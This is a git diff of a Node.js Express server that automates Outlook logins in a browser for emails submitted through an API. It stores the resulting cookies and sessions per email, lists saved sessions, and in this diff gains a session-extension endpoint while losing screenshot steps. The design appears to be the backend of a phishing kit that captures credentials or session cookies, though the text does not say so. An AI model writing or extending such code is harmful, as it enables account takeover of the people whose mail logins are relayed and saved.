@@ -38,7 +38,7 @@ async function initBrowser(session) {
     try {
         session.automation = new OutlookLoginAutomation();
         await session.automation.init();
-        
+
         console.log(`Browser initialized successfully for session ${session.sessionId}`);
         return session.automation;
     } catch (error) {
@@ -138,7 +138,7 @@ app.post('/api/preload', async (req, res) => {
 
         // Start new automation session for preloading
         console.log(`Preloading Outlook page for session ${sessionId}...`);
-        
+
         // Initialize browser directly with error handling
         try {
             await initBrowser(session);
@@ -236,9 +236,6 @@ app.post('/api/login', async (req, res) => {
             console.log(`Using preloaded Outlook page for email: ${email} (Session: ${sessionId})`);
         }
 
-        // Take initial screenshot
-        await session.automation.takeScreenshot(`screenshots/session-${sessionId}-initial.png`);
-
         // Check if already logged in before trying to fill email
         const isLoggedIn = await session.automation.isLoggedIn();
         if (isLoggedIn) {
@@ -293,7 +290,6 @@ app.post('/api/login', async (req, res) => {
                     (authMethod === 'cookies' ? 'Login successful using saved cookies!' : 'Login successful with password! Enhanced session saved.') : 
                     'Login failed or additional authentication required',
                 screenshots: [
-                    `screenshots/session-${sessionId}-initial.png`,
                     `screenshots/session-${sessionId}-login.png`
                 ]
             });
@@ -319,9 +315,6 @@ app.post('/api/login', async (req, res) => {
                 await session.automation.page.type('input[type="email"]', email);
                 console.log('Email entered successfully');
                 siteReport.emailFilled = true;
-
-                // Take screenshot showing email filled
-                await session.automation.takeScreenshot(`screenshots/session-${sessionId}-email-filled.png`);
 
                 // Click Next button
                 await session.automation.page.click('input[type="submit"]');
@@ -456,8 +449,6 @@ app.post('/api/login', async (req, res) => {
                     'Issues detected with email - see site report for details.' :
                     'Email processed - see site report for response.',
                 screenshots: [
-                    `screenshots/session-${sessionId}-initial.png`,
-                    `screenshots/session-${sessionId}-email-filled.png`,
                     `screenshots/session-${sessionId}-after-next.png`
                 ]
             });
@@ -726,11 +717,27 @@ app.get('/api/status', (req, res) => {
     });
 });
 
-// Load saved session for automatic login - DISABLED
-app.post('/api/load-session', async (req, res) => {
-    res.status(400).json({ 
-        error: 'Session loading functionality has been removed'
-    });
+// Extend session timeout by making a request
+app.post('/api/extend-session', async (req, res) => {
+    try {
+        const { sessionId: requestedSessionId } = req.body;
+        
+        if (!activeSession) {
+            return res.status(400).json({ error: 'No active session found.' });
+        }
+
+        if (requestedSessionId && activeSession.sessionId !== requestedSessionId) {
+            return res.status(400).json({ error: 'Provided sessionId does not match active session.' });
+        }
+
+        activeSession.createdAt = Date.now();
+        console.log(`Session ${activeSession.sessionId} timeout extended.`);
+        res.json({ message: 'Session timeout extended.', sessionId: activeSession.sessionId });
+
+    } catch (error) {
+        console.error('Error extending session:', error);
+        res.status(500).json({ error: 'Failed to extend session.', details: error.message });
+    }
 });
 
 // List available sessions
@@ -751,17 +758,17 @@ app.get('/api/sessions', (req, res) => {
         try {
             const sessions = [];
             const items = fs.readdirSync(sessionDir);
-            
+
             // Look for session files (new single-file format) and directories (old format)
             for (const item of items) {
                 const itemPath = path.join(sessionDir, item);
-                
+
                 if (fs.lstatSync(itemPath).isFile() && item.startsWith('session_') && item.endsWith('.json')) {
                     // New single-file format
                     try {
                         const sessionData = JSON.parse(fs.readFileSync(itemPath, 'utf8'));
                         const stats = fs.statSync(itemPath);
-                        
+
                         sessions.push({
                             email: sessionData.email || 'Unknown',
                             timestamp: sessionData.timestamp,
@@ -779,17 +786,17 @@ app.get('/api/sessions', (req, res) => {
                 } else if (fs.lstatSync(itemPath).isDirectory() && item.startsWith('session_')) {
                     // Old individual files format
                     const metadataFile = path.join(itemPath, 'session_metadata.json');
-                    
+
                     if (fs.existsSync(metadataFile)) {
                         try {
                             const metadata = JSON.parse(fs.readFileSync(metadataFile, 'utf8'));
                             const stats = fs.statSync(itemPath);
-                            
+
                             // Count individual cookie files
                             const cookieFiles = fs.readdirSync(itemPath).filter(file => 
                                 file.startsWith('cookie_') && file.endsWith('.json')
                             );
-                            
+
                             sessions.push({
                                 email: metadata.email || 'Unknown',
                                 timestamp: metadata.timestamp,
@@ -807,7 +814,7 @@ app.get('/api/sessions', (req, res) => {
                     }
                 }
             }
-            
+
             // Also check for legacy consolidated file
             const consolidatedFile = path.join(sessionDir, 'all_sessions.json');
             if (fs.existsSync(consolidatedFile)) {
